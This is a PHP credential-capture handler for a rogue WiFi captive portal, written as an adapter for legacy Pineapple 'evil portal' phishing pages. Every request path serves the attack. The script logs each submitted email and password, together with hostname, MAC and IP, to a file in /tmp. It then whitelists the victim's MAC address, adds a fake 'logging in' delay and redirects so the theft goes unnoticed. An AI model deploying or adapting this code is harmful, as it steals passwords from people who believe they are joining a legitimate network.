<?php
/**
 * Standalone credential capture and whitelist handler
 * This gets copied to /www/goodportal/captiveportal/index.php by the payload
 * and processes captive portal form submissions.
 * 
 * This script was developed as an adapter to work with legacy Pineapple Evil Portals (ie https://github.com/kleo/evilportals)
 */

// Configuration
define('LOG_FILE', '/tmp/goodportal_credentials.log');
define('WHITELIST_FILE', '/tmp/goodportal_whitelist.txt');
define('DEFAULT_REDIRECT', 'http://www.google.com');

// Only process POST requests with credentials
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    
    // Capture submitted data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $hostname = isset($_POST['hostname']) ? trim($_POST['hostname']) : '';
    $mac = isset($_POST['mac']) ? trim($_POST['mac']) : '';
    $ip = isset($_POST['ip']) ? trim($_POST['ip']) : '';
    $target = isset($_POST['target']) ? trim($_POST['target']) : DEFAULT_REDIRECT;

    // Log credentials
    if (! empty($email) && !empty($password)) {
        $logEntry = "[" .  date('Y-m-d H:i:s') . " UTC]\n" .
                    "Email: {$email}\n" . 
                    "Password: {$password}\n" . 
                    "Hostname: {$hostname}\n" .
                    "MAC: {$mac}\n" .
                    "IP:  {$ip}\n" . 
                    "Target: {$target}\n" .
                    str_repeat('-', 50) . "\n\n";
        
        @file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
    }

    // Whitelist MAC address if valid
    if (!empty($mac) && $mac !== 'mac' && preg_match('/^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$/', $mac)) {
        $currentWhitelist = @file_get_contents(WHITELIST_FILE);
        if ($currentWhitelist === false || strpos($currentWhitelist, $mac) === false) {
            @file_put_contents(WHITELIST_FILE, $mac . "\n", FILE_APPEND | LOCK_EX);
        }
    }

    // Add delay to simulate "logging in" and allow whitelist to propagate
    sleep(3);

    // Redirect to target (basic URL validation for OpenWrt minimal PHP)
    if (!empty($target) && (strpos($target, 'http://') === 0 || strpos($target, 'https://') === 0)) {
        header("Location: " . $target);
        exit;
    }
}

// If we get here, just redirect to Google (success page or direct GET request)
header("Location: " . DEFAULT_REDIRECT);
exit;
?>